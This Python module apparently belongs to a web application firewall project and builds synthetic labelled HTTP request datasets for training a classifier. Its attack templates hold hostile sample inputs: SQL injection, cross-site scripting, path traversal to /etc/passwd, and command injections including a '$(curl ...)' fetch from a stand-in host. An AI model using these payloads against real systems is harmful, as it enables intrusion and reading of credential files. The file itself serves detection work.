from __future__ import annotations

import hashlib
import random
from dataclasses import dataclass

from waf.core.models import RequestEnvelope
from waf.features.http_v2 import ProductionHTTPFeatureExtractor


@dataclass(frozen=True, slots=True)
class DatasetBundle:
    X: list[list[float]]
    y: list[int]
    feature_names: tuple[str, ...]
    dataset_version: str


def _rid(seed: int, i: int) -> str:
    return hashlib.sha256(f"{seed}:{i}".encode()).hexdigest()[:16]


def build_training_dataset(samples: int = 4000, seed: int = 42) -> DatasetBundle:
    rng = random.Random(seed)
    extractor = ProductionHTTPFeatureExtractor()
    rows: list[list[float]] = []
    labels: list[int] = []
    feature_names: tuple[str, ...] | None = None
    benign_templates = (
        ("GET", "/", "q="),
        ("GET", "/health", ""),
        ("GET", "/products", "page=1"),
        ("GET", "/products/42", ""),
        ("GET", "/search", "q=shoes"),
        ("GET", "/search", "q=blue+shoes&page=2"),
        ("GET", "/api/item/17", "q=17"),
        ("GET", "/api/item/103", "q=103"),
        ("GET", "/api/items", "page=3&limit=20"),
        ("POST", "/api/login", ""),
        ("POST", "/api/items", ""),
        ("PUT", "/api/profile", ""),
        ("PATCH", "/api/profile", "fields=name"),
        ("DELETE", "/api/cart/12", "confirm=true"),
    )
    attack_templates = (
        ("GET", "/search", "q=1+UNION+SELECT+password+FROM+users"),
        ("GET", "/search", "q=%27%20OR%201%3D1"),
        ("POST", "/comment", "", b"<script>alert(document.domain)</script>"),
        ("GET", "/", "q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
        ("GET", "/../../etc/passwd", ""),
        ("GET", "/download/%2e%2e/%2e%2e/config", ""),
        ("POST", "/api/import", "", b"x=1;cat /etc/passwd"),
        ("POST", "/api/run", "", b"$(curl http://example.invalid/x)"),
    )
    target = max(10, samples)
    for i in range(target):
        malicious = i % 2
        if malicious:
            tpl = attack_templates[rng.randrange(len(attack_templates))]
            method, path, query = tpl[:3]
            body = tpl[3] if len(tpl) > 3 else b""
            if not body and rng.random() < 0.15:
                body = b"x=" + ("A" * rng.randint(20, 120)).encode()
            labels.append(1)
        else:
            method, path, query = benign_templates[rng.randrange(len(benign_templates))]
            body = b""
            if method in {"POST", "PUT", "PATCH"} and rng.random() < 0.55:
                body = b'{"name":"item-%d","value":%d}' % (rng.randint(1, 100), rng.randint(1, 1000))
            labels.append(0)
        req = RequestEnvelope(
            request_id=_rid(seed, i),
            method=method,
            scheme="https" if rng.random() < 0.7 else "http",
            host="example.test",
            path=path,
            query=query,
            headers={
                "Content-Type": "application/json" if body.startswith(b"{") else "application/x-www-form-urlencoded",
                "User-Agent": "phase4-dataset",
            },
            body=body,
        )
        fv = extractor.extract(req)
        if feature_names is None:
            feature_names = tuple(sorted(fv.values))
        rows.append([fv.values[name] for name in feature_names])
    version = f"synthetic-http-v4-s{target}-seed{seed}"
    return DatasetBundle(rows, labels, feature_names or (), version)


def build_benign_baseline(samples: int = 2500, seed: int = 123) -> tuple[list[list[float]], tuple[str, ...], str]:
    """Build a varied benign-only baseline with realistic HTTP header/body variation."""
    rng = random.Random(seed)
    extractor = ProductionHTTPFeatureExtractor()
    templates = (
        ("GET", "/", ""),
        ("GET", "/health", ""),
        ("GET", "/products", "page=1"),
        ("GET", "/products/42", ""),
        ("GET", "/search", "q=shoes"),
        ("GET", "/search", "q=blue+shoes&page=2"),
        ("GET", "/api/item/17", "q=17"),
        ("GET", "/api/items", "page=3&limit=20"),
        ("POST", "/api/login", ""),
        ("POST", "/api/items", ""),
        ("PUT", "/api/profile", ""),
        ("PATCH", "/api/profile", "fields=name"),
        ("DELETE", "/api/cart/12", "confirm=true"),
    )
    names: tuple[str, ...] | None = None
    rows: list[list[float]] = []
    for i in range(max(32, samples)):
        method, path, query = rng.choice(templates)
        if rng.random() < 0.15:
            query = f"page={rng.randint(1,20)}&limit={rng.choice((10,20,50))}"
        body = b""
        headers: dict[str, str] = {}
        if rng.random() < 0.78:
            headers["User-Agent"] = rng.choice(("Mozilla/5.0", "Chrome", "MobileBrowser", "phase4-client"))
        if rng.random() < 0.45:
            headers["Accept"] = rng.choice(("application/json", "text/html", "*/*"))
        if method in {"POST", "PUT", "PATCH"} and rng.random() < 0.60:
            body = ("{\"name\":\"item-%d\",\"value\":%d}" % (rng.randint(1,100), rng.randint(1,1000))).encode()
            headers["Content-Type"] = "application/json"
            if rng.random() < 0.35:
                headers["Content-Length"] = str(len(body))
        req = RequestEnvelope(
            request_id=_rid(seed, i),
            method=method,
            scheme=rng.choice(("http", "https")),
            host=rng.choice(("example.test", "api.example.test", "shop.example.test")),
            path=path,
            query=query,
            headers=headers,
            body=body,
        )
        fv = extractor.extract(req)
        if names is None:
            names = tuple(sorted(fv.values))
        rows.append([fv.values[name] for name in names])
    return rows[:samples], names or (), f"benign-baseline-v4-s{min(samples, len(rows))}-seed{seed}"
